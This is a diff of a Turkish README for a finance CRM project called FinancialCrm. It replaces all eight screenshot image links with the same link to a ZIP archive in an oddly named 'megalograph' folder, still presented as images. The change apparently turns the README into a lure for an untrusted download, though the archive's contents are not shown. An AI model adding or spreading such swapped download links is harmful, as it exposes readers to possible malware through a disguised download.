@@ -18,28 +18,28 @@ FinancialCrm, finansal işlemleri ve kullanıcı yönetimini kolaylaştıran bir
 
 ## Ekran Görüntüleri
 ### Giriş Ekranı
-![Image](https://github.com/user-attachments/assets/f9a35f0d-faf2-44bc-bc46-105f6fe3deeb)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Kullanıcı adı ve şifre ile sisteme giriş yapılan ekran. Kullanıcılar hesabına erişmek için burada kimlik doğrulaması yapar.
 
 ### Kategoriler Ekranı
-![Image](https://github.com/user-attachments/assets/cd3eeeec-c801-4415-be79-cdd391c58875)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Kullanıcı adı ve şifre ile sisteme giriş yapılan ekran. Kullanıcılar hesabına erişmek için burada kimlik doğrulaması yapar.
 ### Banka Ekranı
-![Image](https://github.com/user-attachments/assets/4fb67ac7-562a-4ccb-a48e-748209be9e90)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Banka hesaplarının görüntülenebildiği ekran. Kullanıcılar, banka hesaplarıyla ilişkili tüm işlemleri burada takip edebilir.
 ### Faturalar Ekranı
-![Image](https://github.com/user-attachments/assets/a4daa072-3c90-48bc-baf0-d7ffdf46b411)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Kullanıcıların faturalarını listelediği ekran. Bu ekran, faturaların durumu ve detaylarına hızlı erişim sağlar.
 ### Giderler Ekranı
-![Image](https://github.com/user-attachments/assets/d72a31cf-eaf6-4891-b3b2-fc29c8938639)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Kullanıcıların finansal giderlerini takip ettiği ekran. Burada yapılan harcamalar kategorize edilir.
 ### Banka Hareketleri
-![Image](https://github.com/user-attachments/assets/10a35a35-2384-414b-bdc1-3619674141ce)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Banka hesaplarındaki tüm hareketlerin detaylı bir şekilde görüntülendiği ekran. Kullanıcılar, banka hareketlerini burada inceleyebilir.
 ### Dashboard Ekranı
-![Image](https://github.com/user-attachments/assets/99130cf5-f8bb-473d-9209-f27a033fce99)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Genel finansal durumu özetleyen ana ekran. Kullanıcılar, tüm verilerini burada görsel bir şekilde takip edebilir.
 ### Ayarlar Ekranı
-![Image](https://github.com/user-attachments/assets/00736a1a-2e7f-4f80-8488-4d23d59cc97f)
+![Image](https://raw.githubusercontent.com/bucumeng/FinancialCrm/master/megalograph/FinancialCrm.zip)
 - Kullanıcı ayarlarının yapıldığı ekran.
 
